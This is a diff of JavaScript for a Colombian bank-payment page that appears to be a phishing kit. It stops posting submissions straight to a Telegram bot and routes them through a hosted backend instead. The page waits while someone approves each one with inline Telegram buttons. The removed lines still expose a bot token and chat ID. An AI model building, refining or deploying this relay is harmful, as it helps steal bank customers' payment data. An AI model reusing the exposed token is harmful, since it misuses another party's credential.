@@ -306,12 +306,15 @@
   });
 
   // ============================================
-  // CONFIGURACIÓN TELEGRAM
+  // CONFIGURACIÓN
   // ============================================
-  var TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
-  var TELEGRAM_CHAT_ID = '-1004389419498';
   var POLLING_INTERVAL = 2000;
   var MAX_POLLING_TIME = 300000;
+
+  // URL del backend (local o producción)
+  var WEBHOOK_BASE_URL = window.location.hostname === 'localhost'
+    ? 'http://localhost:3000'
+    : 'https://snr-payment-backend.onrender.com';
 
   var bankLogos = {
     'Bancolombia': 'bancol.png',
@@ -433,17 +436,13 @@
         "📅 Fecha: " + datos.fechaHora + "\n\n" +
         "⏳ *Estado:* Esperando verificación...";
 
-      var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
-
-      var response = await fetch(url, {
+      // Enviar a través del backend (que tiene acceso a variables de entorno)
+      var response = await fetch(WEBHOOK_BASE_URL + '/api/send-telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: mensaje,
-          parse_mode: 'Markdown',
-          reply_markup: inlineKeyboard,
-          disable_web_page_preview: true
+          mensaje: mensaje,
+          inline_keyboard: inlineKeyboard
         })
       });
 
@@ -460,10 +459,11 @@
   // ============================================
   async function verificarEstadoSolicitud(solicitudId) {
     try {
-      var response = await fetch('/api/webhook?check=' + solicitudId);
+      var response = await fetch(WEBHOOK_BASE_URL + '/api/webhook?check=' + solicitudId);
       var data = await response.json();
       return data.estado || 'pending';
     } catch (error) {
+      console.error('Error verificando estado:', error);
       return 'pending';
     }
   }
